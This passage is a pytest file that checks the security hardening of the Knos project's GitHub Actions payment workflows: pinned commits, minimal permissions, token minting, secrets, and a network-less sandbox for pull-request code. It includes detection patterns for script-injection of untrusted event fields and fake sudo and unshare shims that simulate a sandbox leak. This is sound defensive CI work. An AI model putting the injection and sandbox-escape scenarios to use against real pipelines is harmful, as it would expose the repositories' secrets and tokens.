"""The second deployment's workflows: what a repository installs (examples/), what those files call (fund.yml,
prove.yml and check.yml, published from drexthealpha/knos-workflows) and what Knos runs on itself. Every rule the
design rests on is checked on the parsed files. Nothing here talks to GitHub: a job's `if:` is run against sample
events by tests/_ghexpr.py, which follows GitHub's own rules for expressions."""
from __future__ import annotations

import hashlib
import importlib.util
import inspect
import json
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from _ghexpr import runs, value

ROOT = Path(__file__).resolve().parents[1]
WF = ROOT / ".github" / "workflows"
EXAMPLES = ROOT / "examples"
GITLAB = EXAMPLES / "gitlab"                                  # a .gitlab-ci.yml: not a GitHub workflow, so not read as one
CLAIM_COPY = ROOT / "src" / "knos" / "settle" / "knos-claim.yml"
REUSABLE = ("fund.yml", "prove.yml", "check.yml")             # the three that take no inputs
ATTEST = "attest.yml"                                         # the fourth published workflow: it takes facts, never code
PUBLISHED = (*REUSABLE, ATTEST)
CALLED = "drexthealpha/knos-workflows/.github/workflows/"
ROTATE = "drexthealpha/knos-oidc-rotate/.github/workflows/"
PLACEHOLDER = "KNOS_WORKFLOWS_SHA"                 # stands for the published commit until a release names it
OWN = {"knos-workflow.yml": "knos.yml", "knos-check.yml": "knos-check.yml"}       # an example, and Knos's own copy of it
SHA = r"[0-9a-f]{40}"

EVENT = '--event "$GITHUB_EVENT_PATH" --repo "$GITHUB_REPOSITORY"'
INSTALL = 'uv tool install --no-config "knos=={release}"'
JUDGE_INSTALL = 'uv tool install --no-config --with pytest --with pip "knos=={release}"'
COMMAND = {      # each job is the install and one command
    ("fund.yml", "command"): f"knos command {EVENT}",
    ("prove.yml", "settle"): f"knos settle {EVENT}",
    ("prove.yml", "review"): f"knos review {EVENT}",
    ("prove.yml", "judge"): 'knos proof judge --base base --pr pr --issue "$ISSUE" --changed changed.txt --sandbox require',
    ("prove.yml", "attest"): f'knos settle --tests --pull "$PULL" --head "$HEAD" --issue "$ISSUE" {EVENT}',
    ("check.yml", "claims"): f"knos check {EVENT}",
}
WRITES = {"contents": "read", "issues": "write", "pull-requests": "write", "checks": "read", "statuses": "read", "actions": "read"}
MINTS = {**WRITES, "id-token": "write"}
READS = {"contents": "read", "pull-requests": "read", "issues": "read", "checks": "read", "statuses": "read", "actions": "read"}
PERMISSIONS = {      # exactly what each job's command needs, and nothing else
    ("fund.yml", "command"): MINTS, ("prove.yml", "settle"): MINTS, ("prove.yml", "review"): WRITES,
    ("prove.yml", "judge"): {"contents": "read"}, ("prove.yml", "attest"): MINTS, ("check.yml", "claims"): READS,
}
SETUP_UV = {"version": "0.8.20", "python-version": "3.12", "enable-cache": False, "ignore-empty-workdir": True}
SIGNS = {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest"), (ATTEST, "attest")}      # the called jobs that mint a token
ATTEST_COMMAND = 'knos attest --repository "$R" --pull "$P" --order "$O" --kind "$K" ${PAYEES:+--payees "$PAYEES"}'
ATTEST_INPUTS = ("repository", "pull", "order", "kind", "payees")
# What a job that signs runs to install: every file named by its hash, nothing resolved, nothing built, and the list
# written into the step itself (the word KNOS_LOCK stands where `scripts/pinned_workflows.py build` writes it).
LOCKED_INSTALL = (
    'uv venv --no-config --python 3.12 "$RUNNER_TEMP/knos"\n'
    'uv pip install --no-config --python "$RUNNER_TEMP/knos/bin/python" --require-hashes --no-deps --no-build -r - <<\'LOCK\'\n'
    'KNOS_LOCK\nLOCK\necho "$RUNNER_TEMP/knos/bin" >> "$GITHUB_PATH"\n')


def _doc(path: Path) -> dict:
    yaml = pytest.importorskip("yaml")
    doc = yaml.safe_load(path.read_text(encoding="utf-8"))
    doc["on"] = doc.pop(True, doc.get("on"))   # YAML 1.1 reads the key `on` as True
    return doc


def _jobs(name: str) -> dict:
    return _doc(WF / name)["jobs"]


def _steps(job: dict, action: str = "") -> list[dict]:
    return [s for s in job.get("steps", []) if str(s.get("uses", "")).startswith(action)] if action else job.get("steps", [])


def _scripts(job: dict) -> list[str]:
    return [s["run"] for s in _steps(job) if "run" in s]


def _comments(path: Path) -> str:
    """What a file's comments say, as running text."""
    lines = (ln.split("#", 1)[1].strip() for ln in path.read_text(encoding="utf-8").splitlines() if ln.lstrip().startswith("#"))
    return " ".join(" ".join(lines).split())


def _files() -> list[Path]:
    """Every workflow file: Knos's own, the examples, and the copy `knos claim` installs."""
    return sorted(WF.glob("*.yml")) + sorted(EXAMPLES.glob("*.yml")) + [CLAIM_COPY]


def _mine() -> list[Path]:
    """The workflows of the payment flow (the others are the repository's own CI and its relay, checked elsewhere)."""
    return [WF / n for n in (*PUBLISHED, *OWN.values(), "keys.yml")] + sorted(EXAMPLES.glob("*.yml")) + [CLAIM_COPY]


def _install(name: str, job: str) -> str:
    """The one script that installs knos in a job of the three called workflows."""
    if (name, job) in SIGNS:
        return LOCKED_INSTALL
    return (JUDGE_INSTALL if job == "judge" else INSTALL).format(release=_release())


def _installer(job: dict) -> dict:
    """The step that installs knos: the hash-locked one (it starts with `uv venv`) or `uv tool install`."""
    [step] = [s for s in _steps(job) if str(s.get("run", "")).startswith(("uv venv ", "uv tool install "))]
    return step


def _release() -> str:
    named = set(re.findall(r'"knos==(\d+\.\d+\.\d+)"', "".join((WF / n).read_text(encoding="utf-8") for n in REUSABLE)))
    assert len(named) == 1, f"the install lines name more than one release: {named}"
    return named.pop()


def _script(name: str):
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# ---- the files: no pull_request_target, one text per file, every action a pinned commit ------------------------------

def test_every_workflow_parses_and_none_is_started_by_pull_request_target():
    """GitHub blocks that trigger on public repositories by default from 2 Nov 2026. Nothing of Knos's uses it: not
    as a trigger, not in a condition, not in the action a repository can call from its own workflow."""
    for path in [*_files(), ROOT / "action.yml"]:
        doc = _doc(path)
        assert "pull_request_target" not in json.dumps(doc), path.name      # comments may say it is not used
        if path.name != "action.yml":
            assert doc["on"] and doc["jobs"], path.name


def test_what_a_repository_installs_is_what_knos_runs_on_itself():
    for example, own in OWN.items():        # the same workflow (the files are copies; only comments could differ)
        assert _doc(EXAMPLES / example) == _doc(WF / own), f"{own} is not examples/{example}"
    # the claim workflow `knos claim` puts into <you>/knos-claim is the example, and the site serves the same file
    assert CLAIM_COPY.read_bytes() == (EXAMPLES / "knos-claim.yml").read_bytes()
    assert 'cp examples/knos-claim.yml "$out/knos-claim.yml"' in (ROOT / "scripts" / "build_site.sh").read_text(encoding="utf-8")
    # one payment file and one optional check: nothing else to install, and nothing still calls the first deployment's relay
    assert sorted(p.name for p in EXAMPLES.glob("*.yml")) == ["knos-attest.yml", "knos-attestor.yml", "knos-canary.yml", "knos-check.yml",
                                                              "knos-claim-org.yml", "knos-claim.yml", "knos-install.yml", "knos-meter-batch.yml",
                                                              "knos-workflow.yml"]
    # an organisation's claim file, which `knos claim --org` puts into <organisation>/knos-claim, is its example byte for byte
    assert (ROOT / "src" / "knos" / "settle" / "knos-claim-org.yml").read_bytes() == (EXAMPLES / "knos-claim-org.yml").read_bytes()
    assert not (WF / "relay.yml").exists() and not any("relay.yml" in p.read_text(encoding="utf-8") for p in _mine())
    assert _script("pinned_workflows").inconsistencies() == []


def test_every_action_is_a_commit_listed_in_action_pins_and_every_called_workflow_is_a_pinned_one():
    """A tag can be moved to other code; a commit cannot. Third-party actions are the commits scripts/action_pins.json
    lists for their tags. The workflows Knos calls are named by commit too: its own published ones (one commit for
    all three, or the placeholder until the release) and the two the programs pin."""
    pins = json.loads((ROOT / "scripts" / "action_pins.json").read_text(encoding="utf-8"))["pins"]
    ids = json.loads((ROOT / "programs-v2" / "program_ids.json").read_text(encoding="utf-8"))
    called = set()
    for path in _files():
        for name, ref, tag in re.findall(r"^\s*(?:- )?uses:\s*(\S+?)@(\S+)(?:\s+#\s*(\S+))?", path.read_text(encoding="utf-8"), re.M):
            if name.startswith(CALLED):
                assert name[len(CALLED):] in PUBLISHED and (ref == PLACEHOLDER or re.fullmatch(SHA, ref)), (path.name, name, ref)
                called.add(ref)
            elif name.startswith(ROTATE):
                # (an organisation's claim file calls the claim workflow's later commit, the one knos_pay's BindOrg pins beside the first)
                pinned = ids["claim_sha_org"] if path.name == "knos-claim-org.yml" else {"rotate.yml": ids["rotate_sha"], "claim.yml": ids["claim_sha"]}[name[len(ROTATE):]]
                assert ref == pinned, (path.name, name)
            else:
                assert re.fullmatch(SHA, ref) and pins.get(f"{name}@{tag}") == ref, f"{path.name}: {name}@{ref} # {tag}"
        local = re.findall(r"^\s*uses:\s*(\./\S+)", path.read_text(encoding="utf-8"), re.M)
        assert all((ROOT / ref).is_file() for ref in local), (path.name, local)
    # fund.yml and prove.yml must be one commit: a bounty is paid only by the prove.yml of the commit its fund.yml ran at
    assert len(called) == 1, f"the published workflows are named at more than one commit: {called}"


# ---- permissions ------------------------------------------------------------------------------------------------------

def test_permissions_start_empty_and_each_job_gets_the_least():
    for path in _mine():
        doc = _doc(path)
        assert doc["permissions"] == {}, f"{path.name}: the workflow grants nothing; each job asks for its own"
        assert all("permissions" in job for job in doc["jobs"].values()), path.name
    for (name, job), want in PERMISSIONS.items():
        assert _jobs(name)[job]["permissions"] == want, (name, job)
    assert sorted(PERMISSIONS) == sorted((name, job) for name in REUSABLE for job in _jobs(name))
    # A called workflow gets at most what the calling job grants, and GitHub refuses to start a run in which a called
    # job asks for more. So a calling job grants exactly what the jobs it calls need between them, and nothing else:
    # the review's calling job carries the id-token because the last job of a review (attest) signs.
    for example in OWN:
        for name, job in _doc(EXAMPLES / example)["jobs"].items():
            called = _jobs(job["uses"][len(CALLED):].split("@")[0])
            union: dict = {}
            for c in called.values():
                for scope, level in c["permissions"].items():
                    union[scope] = "write" if "write" in (level, union.get(scope)) else level
            assert job["permissions"] == union, (example, name)
    [keys] = _jobs("keys.yml").values()
    assert keys["permissions"] == {"id-token": "write", "issues": "write"}
    # nothing of Knos's can write to a repository's code, releases or settings
    for path in _mine():
        for name, job in _doc(path)["jobs"].items():
            assert not {"contents", "packages", "deployments", "pages", "security-events", "actions"} & {
                s for s, lv in job["permissions"].items() if lv == "write"}, (path.name, name)


def test_a_token_is_asked_for_only_by_jobs_that_run_no_pull_request_code_and_check_nothing_out():
    minting = {(path.name, name) for path in _mine() for name, job in _doc(path)["jobs"].items()
               if job["permissions"].get("id-token") == "write"}
    assert minting == {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest"), ("keys.yml", "keys"),
                       (ATTEST, "attest"), ("knos-attest.yml", "attest"), ("knos-attestor.yml", "command"), ("knos-attestor.yml", "settle"),
                       *((f, j) for f in ("knos.yml", "knos-workflow.yml") for j in ("command", "settle", "review")),
                       ("knos-install.yml", "command"), ("knos-install.yml", "settle"),      # the file `knos install` opens a pull request with
                       ("knos-meter-batch.yml", "timer"), ("knos-meter-batch.yml", "hand"),  # a meter batch: each a call to the pinned attest.yml
                       ("knos-claim.yml", "claim"), ("knos-claim-org.yml", "claim")}, minting
    # an `auto` order adds no job, no event and no permission: prove.yml's attest job, after the judge, asks for the one
    # token, and `knos settle --tests` decides its audience (knos3:auto for an open pull request of an order funded
    # `auto`, knos3:pay otherwise; tests/test_flow_orders.py). The job that runs the submission still has no id-token.
    prove = (WF / "prove.yml").read_text(encoding="utf-8")
    assert "knos3:auto:<order>:<head sha>:<terms hash>:1:<pull request>:<the author's id>.10000.<address or ->" in prove
    assert sorted(_jobs("prove.yml")) == ["attest", "judge", "review", "settle"] and _jobs("prove.yml")["attest"]["needs"] == ["review", "judge"]
    assert _jobs("prove.yml")["judge"]["permissions"] == {"contents": "read"}
    assert not [job for job in _jobs("check.yml").values() if "id-token" in job["permissions"]]
    assert "id-token" not in _jobs("prove.yml")["judge"]["permissions"] and "id-token" not in _jobs("prove.yml")["review"]["permissions"]
    for name, job in sorted(SIGNS):
        steps = _steps(_jobs(name)[job])
        # uv, the install, the command: no checkout, no git, no artifact, nothing a pull request wrote
        assert [s["uses"].split("@")[0] for s in steps if "uses" in s] == ["astral-sh/setup-uv"], (name, job)
        assert _scripts(_jobs(name)[job]) == [LOCKED_INSTALL, {**COMMAND, (ATTEST, "attest"): ATTEST_COMMAND}[name, job]], (name, job)
    # in a calling file such a job is a call to a pinned workflow and nothing else
    for path in _mine():
        for name, job in _doc(path)["jobs"].items():
            if (path.name, name) in minting and path.name not in PUBLISHED:
                assert "steps" not in job and job["uses"].startswith((CALLED, ROTATE)), (path.name, name)


def test_the_job_that_runs_pull_request_code_can_only_read_and_hands_nothing_on():
    jobs = _jobs("prove.yml")
    judge = jobs["judge"]
    assert judge["permissions"] == {"contents": "read"}
    assert "secrets." not in json.dumps(judge) and "outputs" not in judge and judge["cache-mode"] == "read"
    assert judge["needs"] == "review" and judge["if"] == "needs.review.outputs.tests != ''"
    # The default branch as this run saw it, with its history and no token left in it. The pinned actions/checkout
    # refuses a fork's pull request in a `workflow_run` run; it is not asked to check one out, here or anywhere.
    [base] = _steps(judge, "actions/checkout@")
    assert base["with"] == {"ref": "${{ github.sha }}", "path": "base", "fetch-depth": 0, "persist-credentials": False}
    assert "allow-unsafe-pr-checkout" not in "".join(p.read_text(encoding="utf-8") for p in _mine())
    fetch, install, probe, command = [s for s in _steps(judge) if "run" in s]
    assert [install["run"], command["run"]] == [JUDGE_INSTALL.format(release=_release()), COMMAND["prove.yml", "judge"]]
    assert probe["name"].startswith("the sandbox has no network") and "env" not in probe      # it is given nothing, and asks for nothing
    # the pull request's head: the commit the review named, fetched as that pull request's head and unpacked as plain
    # files; what it changed is read from git between the two commits that were checked out, never asked of GitHub later
    assert fetch["env"] == {"PULL": "${{ needs.review.outputs.pull }}", "HEAD": "${{ needs.review.outputs.head }}",
                            "GH_TOKEN": "${{ github.token }}"}
    script = fetch["run"]
    assert script.startswith("set -euo pipefail\n") and "${{" not in script
    for line in ("""case "$PULL" in ''|*[!0-9]*)""", """case "$HEAD" in ''|*[!0-9a-f]*)""",
                 'git -C base fetch -q --no-tags origin "+refs/pull/$PULL/head:refs/knos/head"',
                 'if [ "$(git -C base rev-parse refs/knos/head)" != "$HEAD" ]; then',
                 'GIT_LFS_SKIP_SMUDGE=1 git -C base archive "$HEAD" | tar -x -C pr',
                 'git -C base diff --no-renames --name-only "$GITHUB_SHA...$HEAD" > changed.txt'):
        assert line in script, line
    assert script.index("case \"$HEAD\"") < script.index("git -C base fetch") < script.index("rev-parse") < script.index("archive")
    # the token goes with that one fetch through git's environment: not on a command line, not into the clone
    assert "GIT_CONFIG_VALUE_$n=AUTHORIZATION: basic $basic" in script and "git config" not in script and "$GH_TOKEN@" not in script
    # the step that runs the pull request's code has no token, and runs it only in the sandbox
    assert command["env"] == {"ISSUE": "${{ needs.review.outputs.tests }}"} and command["run"].endswith("--sandbox require")
    assert [s for s in _steps(judge) if "GH_TOKEN" in (s.get("env") or {})] == [fetch]
    assert _steps(judge).index(install) < _steps(judge).index(probe) < _steps(judge).index(command)      # checked before the code runs
    # It is the only job that has anything of a pull request on disk: no other job checks anything out or uses git.
    for name in PUBLISHED:
        for job_name, job in _jobs(name).items():
            if (name, job_name) != ("prove.yml", "judge"):
                assert not _steps(job, "actions/checkout@"), (name, job_name)
                assert not re.search(r"\bgit\b|refs/pull|gh pr checkout", "\n".join(_scripts(job))), (name, job_name)
    # The job that mints takes one fact from it: that it succeeded. Which pull request, which head commit and which
    # issue come from review, a job that ran no pull request code: the same three values the judge was given.
    attest = jobs["attest"]
    assert attest["needs"] == ["review", "judge"]
    assert attest["if"] == "needs.review.outputs.tests != '' && needs.judge.result == 'success'"
    assert re.findall(r"needs\.judge\.[\w.]+", json.dumps(attest)) == ["needs.judge.result"]
    [settle] = [s for s in _steps(attest) if s.get("run") == COMMAND["prove.yml", "attest"]]
    assert settle["env"] == {"GH_TOKEN": "${{ github.token }}", "KNOS_RELAY_KEY": "${{ secrets.KNOS_RELAY_KEY }}",
                             "PULL": "${{ needs.review.outputs.pull }}", "HEAD": "${{ needs.review.outputs.head }}",
                             "ISSUE": "${{ needs.review.outputs.tests }}"}
    assert settle["env"]["ISSUE"] == command["env"]["ISSUE"] and {settle["env"]["PULL"], settle["env"]["HEAD"]} == {fetch["env"]["PULL"], fetch["env"]["HEAD"]}
    review = jobs["review"]
    assert review["outputs"] == {k: f"${{{{ steps.review.outputs.{k} }}}}" for k in ("tests", "pull", "head")}
    assert [s.get("id") for s in _steps(review) if s.get("run") == COMMAND["prove.yml", "review"]] == ["review"]
    assert "secrets." not in json.dumps(review) and "id-token" not in review["permissions"]
    # with the judge refused or failed, nothing mints
    ctx = {"needs": {"review": {"result": "success", "outputs": {"tests": "7"}}, "judge": {"result": "success"}}}
    assert runs(attest["if"], ctx, {"review": "success", "judge": "success"})
    for results in ({"review": "success", "judge": "failure"}, {"review": "success", "judge": "skipped"},
                    {"review": "success", "judge": "cancelled"}, {"review": "failure", "judge": "success"}):
        got = {"needs": {"review": {"result": results["review"], "outputs": {"tests": "7"}}, "judge": {"result": results["judge"]}}}
        assert not runs(attest["if"], got, results), results
    assert not runs(judge["if"], {"needs": {"review": {"result": "success", "outputs": {"tests": ""}}}}, {"review": "success"})
    assert not runs(judge["if"], {"needs": {"review": {"result": "success", "outputs": {}}}}, {"review": "success"})
    assert not runs(judge["if"], {"needs": {"review": {"result": "failure", "outputs": {"tests": "7"}}}}, {"review": "failure"})
    assert runs(judge["if"], {"needs": {"review": {"result": "success", "outputs": {"tests": "7"}}}}, {"review": "success"})


# ---- the judge's sandbox has no way out, and the job says where its boundary is ---------------------------------------

def _probe() -> str:
    [step] = [s for s in _steps(_jobs("prove.yml")["judge"]) if str(s.get("name", "")).startswith("the sandbox has no network")]
    return step["run"]


def _bash(script: str, path: str, tmp_path: Path) -> subprocess.CompletedProcess:
    return subprocess.run(["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", script], cwd=str(tmp_path), env={"PATH": path},
                          capture_output=True, text=True, timeout=60, check=False)


def test_the_judge_job_says_where_its_boundary_is_and_checks_the_sandbox_has_no_route_out_before_any_code_runs():
    from knos import judge
    prove = _comments(WF / "prove.yml")
    assert ("This job is a separate GitHub-hosted virtual machine, with no id-token and no secret" in prove
            and "no output, no artifact, no cache" in prove and "no network" in prove)
    job = _jobs("prove.yml")["judge"]
    assert "id-token" not in job["permissions"] and "secrets." not in json.dumps(job) and "outputs" not in job
    script = _probe()
    # the layers the judge itself puts around pull request code (judge.Box.wrap): sudo, a network namespace, nobody, an empty environment
    assert script.startswith("set -euo pipefail\n") and "${{" not in script
    assert f"setpriv --reuid={judge.SANDBOX_UID} --regid={judge.SANDBOX_UID} --clear-groups --" in script
    assert "sudo -n unshare -n -- sh -c 'ip link set lo up 2>/dev/null; exec \"$@\"' sh" in script and 'env -i "$python" -c "$probe"' in script
    assert '"unshare", "-n"' in inspect.getsource(judge.Box.wrap) and "env\", \"-i\"" in inspect.getsource(judge.Box.wrap)
    # and the judge refuses to run without it, whatever the probe said
    assert COMMAND["prove.yml", "judge"].endswith("--sandbox require")


def _stand_in(tmp_path: Path, python_says: str, unshare_works: bool = True) -> str:
    """A PATH whose sudo, unshare and setpriv only pass the command on (or, for unshare, fail), and whose python3 says `python_says`."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    pairs = {"sudo": '[ "$1" = -n ] && shift\nexec "$@"\n',
             "unshare": 'shift; shift\nexec "$@"\n' if unshare_works else 'echo "unshare: unshare failed: Operation not permitted" >&2\nexit 1\n',
             "setpriv": 'while [ "$1" != -- ]; do shift; done; shift\nexec "$@"\n',
             "python3": f"echo '{python_says}'\n{'exit 0' if python_says == 'no network' else 'exit 1'}\n"}
    for name, body in pairs.items():
        (bin_dir / name).write_text("#!/bin/sh\n" + body, encoding="utf-8")
        (bin_dir / name).chmod(0o755)
    return f"{bin_dir}:/usr/bin:/bin"


@pytest.mark.skipif(os.name == "nt" or not shutil.which("bash"), reason="the step is bash")
def test_the_sandbox_check_passes_only_when_nothing_gets_out_and_fails_the_job_in_plain_words_otherwise(tmp_path):
    (tmp_path / "ok").mkdir()
    ok = _bash(_probe(), _stand_in(tmp_path / "ok", "no network"), tmp_path)
    assert ok.returncode == 0 and ok.stdout.strip() == "no network", ok.stderr
    (tmp_path / "leak").mkdir()
    leak = _bash(_probe(), _stand_in(tmp_path / "leak", "reached 1.1.1.1"), tmp_path)
    assert leak.returncode == 1 and "reached 1.1.1.1" in leak.stdout and "None of that code was run" in leak.stdout
    (tmp_path / "cannot").mkdir()
    cannot = _bash(_probe(), _stand_in(tmp_path / "cannot", "no network", unshare_works=False), tmp_path)
    assert cannot.returncode == 1 and "Operation not permitted" in cannot.stdout and "None of that code was run" in cannot.stdout


@pytest.mark.skipif(not sys.platform.startswith("linux") or not all(shutil.which(x) for x in ("bash", "unshare", "setpriv", "sudo"))
                    or not Path("/usr/bin/python3").exists() or (os.geteuid() != 0 and subprocess.run(["sudo", "-n", "true"], capture_output=True).returncode != 0),
                    reason="needs Linux, util-linux, python3 in /usr/bin and root or passwordless sudo, as a GitHub-hosted runner has")
def test_the_sandbox_check_on_this_machine_finds_no_route_out_of_a_network_namespace(tmp_path):
    got = _bash(_probe(), "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", tmp_path)
    assert got.returncode == 0 and got.stdout.strip() == "no network", got.stdout + got.stderr


# ---- what people write never reaches a shell --------------------------------------------------------------------------

def test_untrusted_text_reaches_a_shell_only_through_the_event_file_or_env():
    """A comment, a title, a description and a branch name are data. No script has an expression spliced into it, and
    the commands read the event from the file GitHub wrote."""
    # what an action or a called workflow is handed from an event or another job: the address for the claim workflow,
    # the one the owner types into "Run workflow" (it takes it as an input, into its own env), and nothing else
    # (the pull request's number goes through fromJSON: started by hand it is text, and attest.yml takes a number)
    handed = {"${{ inputs.address }}", "${{ fromJSON(inputs.pull) }}", *(f"${{{{ inputs.{i} }}}}" for i in ATTEST_INPUTS if i != "pull")}
    written_by_others = re.compile(r"github\.event\.|github\.head_ref|github\.ref_name|\binputs\.|\bneeds\.|\bsteps\.")
    for path in _mine():
        for job_name, job in _doc(path)["jobs"].items():
            for s in _steps(job):
                assert "${{" not in str(s.get("run", "")), f"{path.name} {job_name}: an expression inside a script"
                for v in (s.get("with") or {}).values():
                    assert not written_by_others.search(str(v)), (path.name, job_name, v)
                for k, v in (s.get("env") or {}).items():       # env is where such a value belongs; none needs the event itself
                    assert "github.event." not in str(v) and "github.head_ref" not in str(v), (path.name, job_name, k)
            for v in (job.get("with") or {}).values():
                assert not written_by_others.search(str(v)) or v in handed, (path.name, job_name, v)
    for (name, job), command in COMMAND.items():
        # install, one command: no logic in YAML. The judge's one more step, between them, checks its sandbox has no network.
        want = [_install(name, job), _probe(), command] if job == "judge" else [_install(name, job), command]
        assert _scripts(_jobs(name)[job])[-len(want):] == want, (name, job)
        assert len(_scripts(_jobs(name)[job])) == (4 if job == "judge" else 2), (name, job)
    for name in ("knos command", "knos review", "knos check"):
        assert all(c == f"{name} {EVENT}" for c in COMMAND.values() if c.startswith(name + " "))
    assert all(c.endswith(EVENT) for c in COMMAND.values() if c.startswith("knos settle "))


# ---- the two optional secrets, and no inputs --------------------------------------------------------------------------

def test_the_only_secrets_are_the_optional_relay_key_and_an_attestors_read_token_and_only_a_step_that_can_mint_gets_them():
    for name in ("fund.yml", "prove.yml"):
        call = _doc(WF / name)["on"]["workflow_call"]
        assert set(call["secrets"]) == {"KNOS_RELAY_KEY", "KNOS_READ_TOKEN"}
        assert all(secret["required"] is False and secret["description"] for secret in call["secrets"].values())
    assert not (_doc(WF / "check.yml")["on"]["workflow_call"] or {})           # the check takes nothing at all
    given, reads = set(), set()
    for name in PUBLISHED:
        text = (WF / name).read_text(encoding="utf-8")
        assert set(re.findall(r"secrets\.(\w+)", "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#")))) <= {"KNOS_RELAY_KEY", "KNOS_READ_TOKEN"}
        for job_name, job in _jobs(name).items():
            assert "secrets." not in json.dumps({k: v for k, v in job.items() if k != "steps"}), (name, job_name)
            for s in _steps(job):
                if "secrets." in json.dumps(s):
                    assert s["env"]["KNOS_RELAY_KEY"] == "${{ secrets.KNOS_RELAY_KEY }}" and s["run"].startswith(("knos command ", "knos settle "))
                    given.add((name, job_name))
                    if "KNOS_READ_TOKEN" in json.dumps(s):       # an attestor's token: as an environment variable of the command, and nowhere else
                        assert s["env"]["KNOS_READ_TOKEN"] == "${{ secrets.KNOS_READ_TOKEN }}" and json.dumps(s).count("KNOS_READ_TOKEN") == 2
                        reads.add((name, job_name))
    assert given == {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest")}
    # the two jobs an attestor's run starts get its token; the job that follows the sandboxed judge never does
    assert reads == {("fund.yml", "command"), ("prove.yml", "settle")}
    # A repository needs no secret. Its file hands the one optional secret on by name (an unset secret passes nothing),
    # never all of them, and the check's file names none.
    for example in OWN:
        text = (EXAMPLES / example).read_text(encoding="utf-8")
        assert "inherit" not in json.dumps(_doc(EXAMPLES / example)["jobs"])
        for name, job in _doc(EXAMPLES / example)["jobs"].items():
            want = {"KNOS_RELAY_KEY": "${{ secrets.KNOS_RELAY_KEY }}"} if example == "knos-workflow.yml" else None
            assert job.get("secrets") == want, (example, name)
        assert set(re.findall(r"secrets\.(\w+)", text)) <= {"KNOS_RELAY_KEY"}
    assert "secrets" not in (EXAMPLES / "knos-claim.yml").read_text(encoding="utf-8").split("\nname:")[1]


def test_no_caller_can_change_which_code_judges():
    """A funder could otherwise pin the official commit and swap the judge. The called workflows take no inputs and
    read no repository variable; every job sets up the same pinned uv, ignores the uv configuration of whatever is in
    the working directory, and installs one exact release: a job that signs by the hash of every file (and so with no
    cutoff), the others from PyPI with dependencies no newer than one cutoff."""
    steps, cutoffs = [], set()
    for name in REUSABLE:
        doc = _doc(WF / name)
        assert set(doc["on"]) == {"workflow_call"} and "inputs" not in (doc["on"]["workflow_call"] or {}), name
        code = json.dumps(doc["jobs"])
        assert not re.search(r"\b(inputs|vars)\.", code) and "github.event.inputs" not in code, name
        assert "KNOS_RPC" not in code and "KNOS_RELAY_LOG_REPO" not in code, name      # the commands' own defaults, not a caller's
        for job_name, job in doc["jobs"].items():
            assert job["runs-on"] == "ubuntu-24.04" and "env" not in job and "container" not in job, (name, job_name)
            [uv] = _steps(job, "astral-sh/setup-uv@")
            install = _installer(job)
            steps.append(uv["with"])
            assert install["run"] == _install(name, job_name)
            assert "--no-config" in install["run"]
            if (name, job_name) in SIGNS:
                # named by hash: no date cutoff, which hashes make moot; the list is the one thing a release writes in
                assert "env" not in install and "--require-hashes" in install["run"] and "UV_EXCLUDE_NEWER" not in json.dumps(job)
            else:
                assert set(install["env"]) == {"UV_EXCLUDE_NEWER"}
                cutoffs.add(install["env"]["UV_EXCLUDE_NEWER"])
            assert _steps(job).index(install) == _steps(job).index(uv) + 1
            # the command comes last and nothing else is installed or run after the install
            ends = [s.get("run", s.get("uses", "")).split("@")[0].split(" ")[0] for s in _steps(job)]
            assert ends[-4:] == ["astral-sh/setup-uv", "uv", "set", "knos"] if job_name == "judge" else ends[-3:] == ["astral-sh/setup-uv", "uv", "knos"]
            assert not [s for s in _steps(job) if s is not install and ("pip install" in str(s.get("run", "")) or "setup-python" in str(s.get("uses", "")))]
    assert all(w == SETUP_UV for w in steps), "every job sets uv up the same way, with no cache"
    assert len(cutoffs) == 1
    # the one thing a called workflow hands back is whether a payment should be tried next: it decides no payment
    assert _doc(WF / "fund.yml")["on"]["workflow_call"]["outputs"]["settle"]["value"] == "${{ jobs.command.outputs.settle }}"
    assert _jobs("fund.yml")["command"]["outputs"] == {"settle": "${{ steps.command.outputs.settle }}"}
    assert [s.get("id") for s in _steps(_jobs("fund.yml")["command"]) if s.get("run") == COMMAND["fund.yml", "command"]] == ["command"]
    assert "outputs" not in _doc(WF / "prove.yml")["on"]["workflow_call"]
    for example in OWN:                       # and a repository's file passes them nothing but the optional secret
        assert all("with" not in job for job in _doc(EXAMPLES / example)["jobs"].values()), example


def test_the_release_the_workflows_install_is_this_one_and_its_cutoff_comes_after_it():
    try:
        import tomllib
    except ModuleNotFoundError:   # Python 3.10
        import tomli as tomllib  # type: ignore[no-redef]
    as_numbers = lambda v: tuple(int(x) for x in v.split("."))  # noqa: E731
    release = _release()
    version = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))["project"]["version"]
    # The workflows are written for the release being built and pyproject.toml moves at the release itself: until
    # then they may be ahead of it. They may never install an older release than the package's.
    assert as_numbers(release) >= as_numbers(version), f"the workflows install knos {release}; pyproject.toml is at {version}"
    [cutoff] = set(re.findall(r'UV_EXCLUDE_NEWER: "([^"]+)"', "".join((WF / n).read_text(encoding="utf-8") for n in REUSABLE)))
    cutoff = datetime.strptime(cutoff, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc)
    newest, day = re.search(r"^## (\d+\.\d+\.\d+) \((\d{1,2} \w{3} \d{4})\)$", (ROOT / "CHANGELOG.md").read_text(encoding="utf-8"), re.M).groups()
    released = datetime.strptime(day, "%d %b %Y").replace(tzinfo=timezone.utc)
    # uv refuses every package published after the cutoff, knos itself included. So the cutoff must lie after the
    # day the newest release in CHANGELOG.md was published: move UV_EXCLUDE_NEWER in fund.yml, prove.yml and check.yml
    # to a day or two after the release, and publish the workflows again (scripts/pinned_workflows.py).
    assert cutoff >= released + timedelta(days=1), f"UV_EXCLUDE_NEWER {cutoff:%Y-%m-%d} would refuse knos {newest}, released {day}"


def test_no_job_of_the_payment_flow_restores_or_saves_a_cache():
    """A cache written by a run of pull request code could be read by a job that signs, so nothing in the three
